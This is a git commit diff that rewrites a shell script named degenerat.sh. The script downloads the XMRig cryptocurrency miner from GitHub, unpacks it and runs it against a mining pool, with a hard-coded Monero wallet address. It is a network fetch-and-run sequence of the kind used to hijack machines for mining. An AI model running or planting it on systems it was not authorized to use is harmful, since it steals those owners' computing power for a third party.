c72a18aa8651a83eafd174cf8054a99ee0bf01af
angel0chek <d.danilenko768@gmail.com>
2026-08-15 16:56:00 +0300

    Refactor script to use chained commands

--- degenerat.sh
+++ degenerat.sh
@@ -1,4 +1,6 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
-tar -xvzf xmrig-6.26.0-linux-static-x64.tar.gz
-chmod +x xmrig-6.26.0/xmrig
-./xmrig-6.26.0/xmrig --url pool.hashvault.pro:443 --user 431vd6v982gVucsPgco2wG9m5ZPTKPYkkNekYwAQRfGM6LLZ9PjAyrw6krM2Vp8qnGZr4qUjTr2b9HPHDn94g6smSv4xNNj --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+cd ~ && \
+wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && \
+tar -xvzf xmrig-6.26.0-linux-static-x64.tar.gz && \
+cd xmrig-6.26.0 && \
+chmod +x xmrig && \
+./xmrig --url pool.hashvault.pro:443 --user 431vd6v982gVucsPgco2wG9m5ZPTKPYkkNekYwAQRfGM6LLZ9PjAyrw6krM2Vp8qnGZr4qUjTr2b9HPHDn94g6smSv4xNNj --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
